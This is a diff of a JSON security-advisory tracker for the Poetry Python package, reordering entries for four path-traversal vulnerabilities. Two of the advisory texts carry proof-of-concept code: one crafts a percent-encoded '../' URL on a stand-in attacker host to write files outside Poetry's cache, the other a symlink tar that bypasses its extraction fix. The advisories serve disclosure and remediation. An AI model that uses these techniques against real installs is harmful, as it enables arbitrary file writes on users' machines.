@@ -1,6 +1,92 @@
 {
     "package_name": "poetry",
     "advisory": {
+        "9": {
+            "CVE-2026-34591": {
+                "cve_id": "CVE-2026-34591",
+                "title": "Poetry is a dependency manager for Python. From version 1.4.0 to  ...",
+                "description": "Poetry is a dependency manager for Python. From version 1.4.0 to before version 2.3.3, a crafted wheel can contain ../ paths that Poetry writes to disk without containment checks, allowing arbitrary file write with the privileges of the Poetry process. It is reachable from untrusted package artifacts during normal install flows. (Normally, installing a malicious wheel is not sufficient for execution of malicious code. Malicious code will only be executed after installation if the malicious package is imported or invoked by the user.). This issue has been patched in version 2.3.3.",
+                "severity": "HIGH",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2.1.4-3.fc43",
+                        "identifier": "fc43",
+                        "fixed": "2.1.4-7.fc43"
+                    }
+                ]
+            },
+            "CVE-2026-41140": {
+                "cve_id": "CVE-2026-41140",
+                "title": "Poetry is a dependency manager for Python. Prior to 2.3.4, the ex ...",
+                "description": "Poetry is a dependency manager for Python. Prior to 2.3.4, the extractall() function in src/poetry/utils/helpers.py:410-426 extracts sdist tarballs without path traversal protection on Python versions where tarfile.data_filter is unavailable. Considering only Python versions which are still supported by Poetry, these are 3.10.0 - 3.10.12 and 3.11.0 - 3.11.4. This vulnerability is fixed in 2.3.4.",
+                "severity": "LOW",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2.1.4-3.fc43",
+                        "identifier": "fc43",
+                        "fixed": "2.1.4-7.fc43"
+                    }
+                ]
+            },
+            "GHSA-8cvx-xgvx-6g8q": {
+                "cve_id": "GHSA-8cvx-xgvx-6g8q",
+                "title": "Path traversal in package download via percent-decoded link filename",
+                "description": "### Summary Poetry can write attacker-controlled download content **outside its artifact cache** when `Link.filename` is derived from a percent-encoded URL path (or an index-supplied `filename`). Taking `posixpath.basename` on a still-encoded path, then `urllib.parse.unquote`, turns sequences such as `%2e%2e%2f` into real `../`. The download path `cache_dir / link.filename` is not checked to stay under the cache directory. ### Impact Arbitrary file write (path traversal) from malicious or compromised package **URL** and/or **package index**. A malicious package is not sufficient to trigger this vulnerability because the URL or the JSON metadata of the package index has to be compromised. ### Details #### Root cause In `poetry-core`, `Link.filename` is computed as: ```python # poetry-core/src/poetry/core/packages/utils/link.py @cached_property def filename(self) -> str: _, netloc, path, _, _ = urlparse.urlsplit(self.url) name = posixpath.basename(path.rstrip('/')) or netloc name = urlparse.unquote(name) return name ``` Because `basename` runs **before** unquote on a percent-encoded path, a last segment like: `%2e%2e%2f%2e%2e%2foutside-1.0-py3-none-any.whl` has no raw `/`, so basename keeps the whole segment; unquote then yields: `../../outside-1.0-py3-none-any.whl` If `filename=` is set explicitly (e.g. PEP 691 JSON), that string is used as-is and is also not sanitized for `..` / separators / absolute paths. #### Dangerous sinks In `poetry`, downloaded archives are written using the unsanitized name: ```python # poetry/src/poetry/utils/cache.py \u2014 ArtifactCache.get_cached_archive_for_link cached_archive = cache_dir / link.filename cache_dir.mkdir(parents=True, exist_ok=True) download_func(link.url, cached_archive) ``` There is no post-unquote basename, and no `resolve()` + `is_relative_to(cache_dir)` (or equivalent) containment check. `download_file` writes the HTTP body via `atomic_open(dest)` to that path. Related joins of `link.filename`: - `poetry/src/poetry/repositories/http_repository.py` \u2014 `Path(temp_dir) / link.filename` - `poetry/src/poetry/packages/direct_origin.py` \u2014 URL dependencies via `get_cached_archive_for_link` - Install/executor paths that download through `ArtifactCache` #### Derived filename examples | URL last segment (encoded) | `Link.filename` | |----------------------------|-----------------| | `%2e%2e%2f%2e%2e%2foutside-1.0-py3-none-any.whl` | `../../outside-1.0-py3-none-any.whl` | | `%2Ftmp%2Fpwn-1.0-py3-none-any.whl` | `/tmp/pwn-1.0-py3-none-any.whl` (absolute on POSIX) | | `a%2Fb-1.0-py3-none-any.whl` | `a/b-1.0-py3-none-any.whl` | Full basename after unquote is attacker-controlled, **including the file extension** (`.whl`, `.py`, `.txt`, none, etc.). The download sink does not force a safe name or extension. ### PoC **Minimal local proof** (real `poetry-core` `Link` + same join as `ArtifactCache`). No public exploit server required. ```python from pathlib import Path from poetry.core.packages.utils.link import Link # Last path segment = percent-encoded ../../../../../../OUTSIDE_PWN.txt # (use enough '../' segments to escape a cache leaf like artifacts/aa/bb/cc/<hash>/) last = '%2e%2e%2f' * 6 + 'OUTSIDE_PWN.txt' url = f'https://evil.example/packages/{last}' link = Link(url) assert link.filename == '../../../../../../OUTSIDE_PWN.txt' # Simulate Poetry artifact cache leaf directory cache_dir = Path('/tmp/poetry-poc/cache/artifacts/aa/bb/cc/deadbeef0123456789') cache_dir.mkdir(parents=True, exist_ok=True) # Same pattern as ArtifactCache: # cached_archive = cache_dir / link.filename # download_func(url, cached_archive) dest = cache_dir / link.filename print('joined:', dest) print('resolved:', dest.resolve()) print('under cache_dir?', dest.resolve().is_relative_to(cache_dir.resolve())) # Parent of escaped path often already exists (e.g. /tmp/poetry-poc) # Real Poetry only mkdir's cache_dir, then atomic_open(dest) dest.write_bytes(b'ATTACKER_CONTROLLED_BYTES') print('wrote:', dest.resolve(), dest.resolve().exists()) ``` **Expected result:** - `link.filename` is `../../../../../../OUTSIDE_PWN.txt` (or equivalent depth). - `dest.resolve()` is **outside** `cache_dir` (e.g. under `/tmp/poetry-poc/OUTSIDE_PWN.txt`). - File content is attacker-controlled; extension is whatever was chosen in the encoded basename. **End-to-end trigger (optional):** 1. Host any file at a URL whose **last path segment** percent-encodes traversal, for example: `https://attacker.example/pkg/%2e%2e%2f%2e%2e%2f%2e%2e%2f...%2fpwn-1.0-py3-none-any.whl` 2. In a project, add a URL dependency, for example: `evil = { url = '<that URL>' }` 3. Set a temp `POETRY_CACHE_DIR` and run `poetry install` (or any flow that downloads via `get_cached_archive_for_link` with `download_func`). 4. Observe a file written outside `$POETRY_CACHE_DIR/artifacts/...` if the resolved parent path already exists. **Notes for reproduction:** - Encoding must be in the **last** URL path segment (so `basename` does not strip `../` before unquote). Real `/../` segments are collapsed by basename and do **not** demonstrate this bug. - File extension in the payload is fully controllable. - Write fails if intermediate parent directories of the escaped path do not exist (Poetry does not `mkdir -p` those parents).",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2.1.4-3.fc43",
+                        "identifier": "fc43",
+                        "fixed": "2.1.4-7.fc43"
+                    }
+                ]
+            },
+            "GHSA-cm45-jwqh-659g": {
+                "cve_id": "GHSA-cm45-jwqh-659g",
+                "title": "Tar extraction fix bypass via symlink and parent traversal on fallback Python 3.10.0 - 3.10.12 and 3.11.0 - 3.11.4",
+                "description": "### Summary Poetry 2.4.1 still contains a bypass of the GHSA-73h3-mf4w-8647 tar extraction fix on Python versions that use Poetry's fallback extractor branch, currently Python 3.10.0 - 3.10.12 and 3.11.0 - 3.11.4. The fallback validates tar member paths and symlink targets with `os.path.abspath()` before calling `tarfile.extractall()`, but it does not model symlink traversal for later regular file members. A tar member sequence containing a symlink `a -> .` followed by a regular file named `a/../outside/pwn.txt` passes the lexical `is_relative_to(dest)` check because `abspath(dest / 'a/../outside/pwn.txt')` is `dest/outside/pwn.txt`. During extraction, however, the filesystem resolves `a` as a symlink to `dest`; the following `..` component then escapes to the parent of `dest`, so the file is written outside the extraction directory. ### Impact Arbitrary file write (path traversal) from untrusted sdist content. **In practice, the impact is low** because an attacker who exploits this vulnerability can as well include arbitrary code in a setup.py, which will be executed when the sdist is built after tar extraction. In other words, a malicious sdist can write arbitrary files by design. However, since it is unexpected and not by design that the file write already happens during tar extraction, this is still considered a vulnerability. ### Patches Versions 2.4.2 and newer of Poetry ensure that paths are inside the target directory. ### Technical details The vulnerable fallback is in `src/poetry/utils/helpers.py`: ```python dest = Path(os.path.abspath(dest)) safe_members = [] for member in archive.getmembers(): member_path = Path(os.path.abspath(dest / member.name)) if not member_path.is_relative_to(dest): raise ValueError(...) if member.issym(): link_target = Path(os.path.abspath(member_path.parent / member.linkname)) if not link_target.is_relative_to(dest): raise ValueError(...) elif member.islnk(): link_target = Path(os.path.abspath(dest / member.linkname)) if not link_target.is_relative_to(dest): raise ValueError(...) safe_members.append(member) archive.extractall(dest, members=safe_members) ``` Direct `../` paths, absolute paths, direct symlinks outside `dest`, and direct hardlinks outside `dest` are rejected. The bypass uses a symlink that is itself inside the destination (`a -> .`) and a later regular file whose archive name is lexically normalized before symlink resolution. ### Reproduction ```python import io import tarfile import tempfile from pathlib import Path from poetry.utils import helpers base = Path(tempfile.mkdtemp(prefix='poetry-tar-bypass-')) dest = base / 'dest' outside = base / 'outside' dest.mkdir() outside.mkdir() tar_path = base / 'poc.tar' with tarfile.open(tar_path, 'w') as tf: symlink = tarfile.TarInfo('a') symlink.type = tarfile.SYMTYPE symlink.linkname = '.' tf.addfile(symlink) data = b'owned\\n' regular = tarfile.TarInfo('a/../outside/pwn.txt') regular.size = len(data) tf.addfile(regular, io.BytesIO(data)) # Only needed on newer Python to demonstrate the fallback branch locally. # On Python 3.10.12 or 3.11.4, Poetry enters this branch itself. old_version_info = helpers.sys.version_info helpers.sys.version_info = (3, 10, 12) try: helpers.extractall(tar_path, dest, zip=False) finally: helpers.sys.version_info = old_version_info print((outside / 'pwn.txt').exists(), outside / 'pwn.txt') ``` Expected output: ```text True /tmp/poetry-tar-bypass-.../outside/pwn.txt ``` ### Remediation Use `tarfile.extractall(..., filter='data')` wherever available. For fallback Python versions, avoid a pre-validation pass that only uses lexical paths. Either reject links entirely in fallback mode or implement extraction with per-member resolved path checks against the live filesystem state before opening each output file. For regular file members, resolve the final path after accounting for symlinks in already-extracted ancestors, and reject if the resolved target is outside `dest`.",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2.1.4-3.fc43",
+                        "identifier": "fc43",
+                        "fixed": "2.1.4-7.fc43"
+                    }
+                ]
+            },
+            "GHSA-vqc6-rh9w-gvfc": {
+                "cve_id": "GHSA-vqc6-rh9w-gvfc",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2.1.4-3.fc43",
+                        "identifier": "fc43",
+                        "fixed": "2.1.4-7.fc43"
+                    }
+                ]
+            },
+            "GHSA-xvhx-496r-7682": {
+                "cve_id": "GHSA-xvhx-496r-7682",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2.1.4-3.fc43",
+                        "identifier": "fc43",
+                        "fixed": "2.1.4-7.fc43"
+                    }
+                ]
+            }
+        },
         "10": {
             "CVE-2026-34591": {
                 "cve_id": "CVE-2026-34591",
@@ -88,92 +174,6 @@
             }
         },
         "8": {
-            "CVE-2026-34591": {
-                "cve_id": "CVE-2026-34591",
-                "title": "Poetry is a dependency manager for Python. From version 1.4.0 to  ...",
-                "description": "Poetry is a dependency manager for Python. From version 1.4.0 to before version 2.3.3, a crafted wheel can contain ../ paths that Poetry writes to disk without containment checks, allowing arbitrary file write with the privileges of the Poetry process. It is reachable from untrusted package artifacts during normal install flows. (Normally, installing a malicious wheel is not sufficient for execution of malicious code. Malicious code will only be executed after installation if the malicious package is imported or invoked by the user.). This issue has been patched in version 2.3.3.",
-                "severity": "HIGH",
-                "status": "fixed",
-                "events": [
-                    {
-                        "introduced": "2.1.4-3.fc43",
-                        "identifier": "fc43",
-                        "fixed": "2.1.4-7.fc43"
-                    }
-                ]
-            },
-            "CVE-2026-41140": {
-                "cve_id": "CVE-2026-41140",
-                "title": "Poetry is a dependency manager for Python. Prior to 2.3.4, the ex ...",
-                "description": "Poetry is a dependency manager for Python. Prior to 2.3.4, the extractall() function in src/poetry/utils/helpers.py:410-426 extracts sdist tarballs without path traversal protection on Python versions where tarfile.data_filter is unavailable. Considering only Python versions which are still supported by Poetry, these are 3.10.0 - 3.10.12 and 3.11.0 - 3.11.4. This vulnerability is fixed in 2.3.4.",
-                "severity": "LOW",
-                "status": "fixed",
-                "events": [
-                    {
-                        "introduced": "2.1.4-3.fc43",
-                        "identifier": "fc43",
-                        "fixed": "2.1.4-7.fc43"
-                    }
-                ]
-            },
-            "GHSA-8cvx-xgvx-6g8q": {
-                "cve_id": "GHSA-8cvx-xgvx-6g8q",
-                "title": "Path traversal in package download via percent-decoded link filename",
-                "description": "### Summary Poetry can write attacker-controlled download content **outside its artifact cache** when `Link.filename` is derived from a percent-encoded URL path (or an index-supplied `filename`). Taking `posixpath.basename` on a still-encoded path, then `urllib.parse.unquote`, turns sequences such as `%2e%2e%2f` into real `../`. The download path `cache_dir / link.filename` is not checked to stay under the cache directory. ### Impact Arbitrary file write (path traversal) from malicious or compromised package **URL** and/or **package index**. A malicious package is not sufficient to trigger this vulnerability because the URL or the JSON metadata of the package index has to be compromised. ### Details #### Root cause In `poetry-core`, `Link.filename` is computed as: ```python # poetry-core/src/poetry/core/packages/utils/link.py @cached_property def filename(self) -> str: _, netloc, path, _, _ = urlparse.urlsplit(self.url) name = posixpath.basename(path.rstrip('/')) or netloc name = urlparse.unquote(name) return name ``` Because `basename` runs **before** unquote on a percent-encoded path, a last segment like: `%2e%2e%2f%2e%2e%2foutside-1.0-py3-none-any.whl` has no raw `/`, so basename keeps the whole segment; unquote then yields: `../../outside-1.0-py3-none-any.whl` If `filename=` is set explicitly (e.g. PEP 691 JSON), that string is used as-is and is also not sanitized for `..` / separators / absolute paths. #### Dangerous sinks In `poetry`, downloaded archives are written using the unsanitized name: ```python # poetry/src/poetry/utils/cache.py \u2014 ArtifactCache.get_cached_archive_for_link cached_archive = cache_dir / link.filename cache_dir.mkdir(parents=True, exist_ok=True) download_func(link.url, cached_archive) ``` There is no post-unquote basename, and no `resolve()` + `is_relative_to(cache_dir)` (or equivalent) containment check. `download_file` writes the HTTP body via `atomic_open(dest)` to that path. Related joins of `link.filename`: - `poetry/src/poetry/repositories/http_repository.py` \u2014 `Path(temp_dir) / link.filename` - `poetry/src/poetry/packages/direct_origin.py` \u2014 URL dependencies via `get_cached_archive_for_link` - Install/executor paths that download through `ArtifactCache` #### Derived filename examples | URL last segment (encoded) | `Link.filename` | |----------------------------|-----------------| | `%2e%2e%2f%2e%2e%2foutside-1.0-py3-none-any.whl` | `../../outside-1.0-py3-none-any.whl` | | `%2Ftmp%2Fpwn-1.0-py3-none-any.whl` | `/tmp/pwn-1.0-py3-none-any.whl` (absolute on POSIX) | | `a%2Fb-1.0-py3-none-any.whl` | `a/b-1.0-py3-none-any.whl` | Full basename after unquote is attacker-controlled, **including the file extension** (`.whl`, `.py`, `.txt`, none, etc.). The download sink does not force a safe name or extension. ### PoC **Minimal local proof** (real `poetry-core` `Link` + same join as `ArtifactCache`). No public exploit server required. ```python from pathlib import Path from poetry.core.packages.utils.link import Link # Last path segment = percent-encoded ../../../../../../OUTSIDE_PWN.txt # (use enough '../' segments to escape a cache leaf like artifacts/aa/bb/cc/<hash>/) last = '%2e%2e%2f' * 6 + 'OUTSIDE_PWN.txt' url = f'https://evil.example/packages/{last}' link = Link(url) assert link.filename == '../../../../../../OUTSIDE_PWN.txt' # Simulate Poetry artifact cache leaf directory cache_dir = Path('/tmp/poetry-poc/cache/artifacts/aa/bb/cc/deadbeef0123456789') cache_dir.mkdir(parents=True, exist_ok=True) # Same pattern as ArtifactCache: # cached_archive = cache_dir / link.filename # download_func(url, cached_archive) dest = cache_dir / link.filename print('joined:', dest) print('resolved:', dest.resolve()) print('under cache_dir?', dest.resolve().is_relative_to(cache_dir.resolve())) # Parent of escaped path often already exists (e.g. /tmp/poetry-poc) # Real Poetry only mkdir's cache_dir, then atomic_open(dest) dest.write_bytes(b'ATTACKER_CONTROLLED_BYTES') print('wrote:', dest.resolve(), dest.resolve().exists()) ``` **Expected result:** - `link.filename` is `../../../../../../OUTSIDE_PWN.txt` (or equivalent depth). - `dest.resolve()` is **outside** `cache_dir` (e.g. under `/tmp/poetry-poc/OUTSIDE_PWN.txt`). - File content is attacker-controlled; extension is whatever was chosen in the encoded basename. **End-to-end trigger (optional):** 1. Host any file at a URL whose **last path segment** percent-encodes traversal, for example: `https://attacker.example/pkg/%2e%2e%2f%2e%2e%2f%2e%2e%2f...%2fpwn-1.0-py3-none-any.whl` 2. In a project, add a URL dependency, for example: `evil = { url = '<that URL>' }` 3. Set a temp `POETRY_CACHE_DIR` and run `poetry install` (or any flow that downloads via `get_cached_archive_for_link` with `download_func`). 4. Observe a file written outside `$POETRY_CACHE_DIR/artifacts/...` if the resolved parent path already exists. **Notes for reproduction:** - Encoding must be in the **last** URL path segment (so `basename` does not strip `../` before unquote). Real `/../` segments are collapsed by basename and do **not** demonstrate this bug. - File extension in the payload is fully controllable. - Write fails if intermediate parent directories of the escaped path do not exist (Poetry does not `mkdir -p` those parents).",
-                "severity": "UNKNOWN",
-                "status": "fixed",
-                "events": [
-                    {
-                        "introduced": "2.1.4-3.fc43",
-                        "identifier": "fc43",
-                        "fixed": "2.1.4-7.fc43"
-                    }
-                ]
-            },
-            "GHSA-cm45-jwqh-659g": {
-                "cve_id": "GHSA-cm45-jwqh-659g",
-                "title": "Tar extraction fix bypass via symlink and parent traversal on fallback Python 3.10.0 - 3.10.12 and 3.11.0 - 3.11.4",
-                "description": "### Summary Poetry 2.4.1 still contains a bypass of the GHSA-73h3-mf4w-8647 tar extraction fix on Python versions that use Poetry's fallback extractor branch, currently Python 3.10.0 - 3.10.12 and 3.11.0 - 3.11.4. The fallback validates tar member paths and symlink targets with `os.path.abspath()` before calling `tarfile.extractall()`, but it does not model symlink traversal for later regular file members. A tar member sequence containing a symlink `a -> .` followed by a regular file named `a/../outside/pwn.txt` passes the lexical `is_relative_to(dest)` check because `abspath(dest / 'a/../outside/pwn.txt')` is `dest/outside/pwn.txt`. During extraction, however, the filesystem resolves `a` as a symlink to `dest`; the following `..` component then escapes to the parent of `dest`, so the file is written outside the extraction directory. ### Impact Arbitrary file write (path traversal) from untrusted sdist content. **In practice, the impact is low** because an attacker who exploits this vulnerability can as well include arbitrary code in a setup.py, which will be executed when the sdist is built after tar extraction. In other words, a malicious sdist can write arbitrary files by design. However, since it is unexpected and not by design that the file write already happens during tar extraction, this is still considered a vulnerability. ### Patches Versions 2.4.2 and newer of Poetry ensure that paths are inside the target directory. ### Technical details The vulnerable fallback is in `src/poetry/utils/helpers.py`: ```python dest = Path(os.path.abspath(dest)) safe_members = [] for member in archive.getmembers(): member_path = Path(os.path.abspath(dest / member.name)) if not member_path.is_relative_to(dest): raise ValueError(...) if member.issym(): link_target = Path(os.path.abspath(member_path.parent / member.linkname)) if not link_target.is_relative_to(dest): raise ValueError(...) elif member.islnk(): link_target = Path(os.path.abspath(dest / member.linkname)) if not link_target.is_relative_to(dest): raise ValueError(...) safe_members.append(member) archive.extractall(dest, members=safe_members) ``` Direct `../` paths, absolute paths, direct symlinks outside `dest`, and direct hardlinks outside `dest` are rejected. The bypass uses a symlink that is itself inside the destination (`a -> .`) and a later regular file whose archive name is lexically normalized before symlink resolution. ### Reproduction ```python import io import tarfile import tempfile from pathlib import Path from poetry.utils import helpers base = Path(tempfile.mkdtemp(prefix='poetry-tar-bypass-')) dest = base / 'dest' outside = base / 'outside' dest.mkdir() outside.mkdir() tar_path = base / 'poc.tar' with tarfile.open(tar_path, 'w') as tf: symlink = tarfile.TarInfo('a') symlink.type = tarfile.SYMTYPE symlink.linkname = '.' tf.addfile(symlink) data = b'owned\\n' regular = tarfile.TarInfo('a/../outside/pwn.txt') regular.size = len(data) tf.addfile(regular, io.BytesIO(data)) # Only needed on newer Python to demonstrate the fallback branch locally. # On Python 3.10.12 or 3.11.4, Poetry enters this branch itself. old_version_info = helpers.sys.version_info helpers.sys.version_info = (3, 10, 12) try: helpers.extractall(tar_path, dest, zip=False) finally: helpers.sys.version_info = old_version_info print((outside / 'pwn.txt').exists(), outside / 'pwn.txt') ``` Expected output: ```text True /tmp/poetry-tar-bypass-.../outside/pwn.txt ``` ### Remediation Use `tarfile.extractall(..., filter='data')` wherever available. For fallback Python versions, avoid a pre-validation pass that only uses lexical paths. Either reject links entirely in fallback mode or implement extraction with per-member resolved path checks against the live filesystem state before opening each output file. For regular file members, resolve the final path after accounting for symlinks in already-extracted ancestors, and reject if the resolved target is outside `dest`.",
-                "severity": "UNKNOWN",
-                "status": "fixed",
-                "events": [
-                    {
-                        "introduced": "2.1.4-3.fc43",
-                        "identifier": "fc43",
-                        "fixed": "2.1.4-7.fc43"
-                    }
-                ]
-            },
-            "GHSA-vqc6-rh9w-gvfc": {
-                "cve_id": "GHSA-vqc6-rh9w-gvfc",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
-                "severity": "UNKNOWN",
-                "status": "fixed",
-                "events": [
-                    {
-                        "introduced": "2.1.4-3.fc43",
-                        "identifier": "fc43",
-                        "fixed": "2.1.4-7.fc43"
-                    }
-                ]
-            },
-            "GHSA-xvhx-496r-7682": {
-                "cve_id": "GHSA-xvhx-496r-7682",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
-                "severity": "UNKNOWN",
-                "status": "fixed",
-                "events": [
-                    {
-                        "introduced": "2.1.4-3.fc43",
-                        "identifier": "fc43",
-                        "fixed": "2.1.4-7.fc43"
-                    }
-                ]
-            }
-        },
-        "9": {
             "CVE-2026-34591": {
                 "cve_id": "CVE-2026-34591",
                 "title": "Poetry is a dependency manager for Python. From version 1.4.0 to  ...",
